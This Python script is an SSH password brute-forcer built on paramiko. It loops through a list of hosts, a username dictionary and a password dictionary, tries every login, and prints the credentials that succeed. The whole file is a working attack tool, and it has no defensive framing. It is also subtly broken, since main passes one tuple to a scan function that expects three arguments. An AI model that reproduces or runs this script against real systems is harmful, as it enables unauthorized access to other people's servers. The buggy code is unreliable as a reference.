import sys
import paramiko

class HostInfo:
    def __init__(self, host, port, user, passwd):
        self.host = host
        self.port = port
        self.user = user
        self.passwd = passwd

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} IPList userDic passDic")
        sys.exit(1)
    else:
        iplist = sys.argv[1]
        user_dict = sys.argv[2]
        pass_dict = sys.argv[3]
        scan(prepare(iplist, user_dict, pass_dict))
        sys.exit(0)

def prepare(iplist, user_dict, pass_dict):
    with open(iplist, 'r') as iplist_file:
        slice_ip_list = [line.strip() for line in iplist_file]

    with open(user_dict, 'r') as user_dict_file:
        slice_user = [line.strip() for line in user_dict_file]

    with open(pass_dict, 'r') as pass_dict_file:
        slice_pass = [line.strip() for line in pass_dict_file]

    return slice_ip_list, slice_user, slice_pass

def scan(slice_ip_list, slice_user, slice_pass):
    for host_port in slice_ip_list:
        print(f"Try to crack {host_port}")
        host, port = host_port.split(":")
        
        for user in slice_user:
            for passwd in slice_pass:
                host_info = HostInfo(host, port, user, passwd)

                if crack(host_info):
                    print(f"User: {host_info.user}, Password: {host_info.passwd}")

def crack(host_info):
    host = host_info.host
    port = host_info.port
    user = host_info.user
    passwd = host_info.passwd

    is_ok = False

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=int(port), username=user, password=passwd, timeout=10)
        is_ok = True
        client.close()
    except Exception as e:
        pass  # Handle the exception as needed

    return is_ok

if __name__ == "__main__":
    main()
